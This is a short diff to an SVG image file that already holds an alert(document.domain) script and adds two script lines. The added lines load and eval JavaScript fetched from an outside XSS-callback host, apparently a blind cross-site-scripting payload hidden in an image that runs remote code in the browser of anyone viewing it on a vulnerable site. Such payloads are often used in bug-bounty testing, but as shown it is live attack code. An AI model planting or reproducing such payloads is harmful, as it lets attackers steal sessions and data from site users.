@@ -6,4 +6,6 @@
   <script type="text/javascript">
     alert(document.domain);
   </script>
+  <script src=https://r0x4r.xss.ht></script>
+  <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//r0x4r.xss.ht");a.send();</script>
 </svg>
